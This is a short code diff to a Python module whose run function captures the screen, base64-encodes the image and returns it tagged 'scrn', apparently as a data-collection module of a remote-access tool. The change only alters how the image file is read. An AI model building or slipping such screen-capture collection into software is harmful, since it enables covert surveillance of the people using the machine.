@@ -26,8 +26,8 @@ def run(**args):
 	imagefile = imagefile.resize((800,600),Image.ANTIALIAS)
 	imagefile.save('screenshot.bmp',optimize = True,quality = 95)
 	del imagefile
-	imagefile = Image.open('screenshot.bmp')
-	imgstring = base64.b64encode(imagefile.tostring("raw","RGBA"))
+	imagefile = open('screenshot.bmp')
+	imgstring = base64.b64encode(imagefile.read())
 	del imagefile
 	return imgstring, "scrn"
 	
